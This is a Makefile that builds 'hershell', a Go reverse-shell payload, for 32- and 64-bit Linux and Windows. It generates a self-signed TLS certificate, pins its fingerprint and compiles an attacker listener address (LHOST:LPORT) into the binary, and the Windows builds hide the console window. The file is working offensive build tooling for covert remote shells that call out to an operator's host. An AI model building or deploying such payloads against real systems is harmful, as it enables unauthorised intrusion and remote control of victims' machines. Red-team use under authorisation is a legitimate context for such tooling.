OUT_LINUX=hershell
OUT_WINDOWS=hershell.exe
SRC=hershell.go
SRV_KEY=server.key
SRV_PEM=server.pem
TYPE=reverse
LINUX_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.connType=${TYPE} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
WIN_LDFLAGS=--ldflags "-X main.connectString=${LHOST}:${LPORT} -X main.connType=${TYPE} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"

all: clean depends shell

depends:
	openssl req -subj '/CN=sysdream.com/O=Sysdream/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}

shell:
	GOOS=${GOOS} GOARCH=${GOARCH} go build ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

linux32:
	GOOS=linux GOARCH=386 go build ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

linux64:
	GOOS=linux GOARCH=amd64 go build ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

windows32:
	GOOS=windows GOARCH=386 go build ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}

windows64:
	GOOS=windows GOARCH=amd64 go build ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}

clean:
	rm -f ${SRV_KEY} ${SRV_PEM} ${OUT_LINUX} ${OUT_WINDOWS}
